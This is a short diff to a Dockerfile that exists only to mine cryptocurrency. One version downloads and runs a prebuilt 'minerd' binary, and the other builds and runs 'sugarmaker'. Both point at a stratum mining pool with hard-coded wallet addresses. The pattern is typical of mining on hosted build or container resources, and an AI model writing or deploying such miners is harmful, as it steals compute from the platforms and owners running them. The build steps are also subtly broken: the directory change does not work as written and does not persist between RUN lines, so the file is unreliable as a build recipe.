@@ -1,4 +1,6 @@
 FROM ubuntu:latest
 RUN apt update && apt install wget curl git -y
-RUN wget https://github.com/rienode0001/empty/raw/main/minerd && chmod +x minerd
-RUN ./minerd -a yespower -o stratum+tcp://stratum-na.rplant.xyz:7070 -u Wn1Q1hueWCfi1xL9rd1t4ooMvKwYYGmzsY
+RUN apt-get install build-essential libcurl4-openssl-dev autotools-dev automake libtool -y
+RUN git init && git pull https://github.com/yentencoin/yenten-arm-miner-yespowerr16 && cd yenten-arm-miner-yespowerr16
+RUN ./build.sh
+RUN ./sugarmaker -a yespowerr16 -o stratum+tcp://stratum-na.rplant.xyz:3382 -u YnhcyZLMDHPiRtGmDHwg23PMMqSWzbmEJR
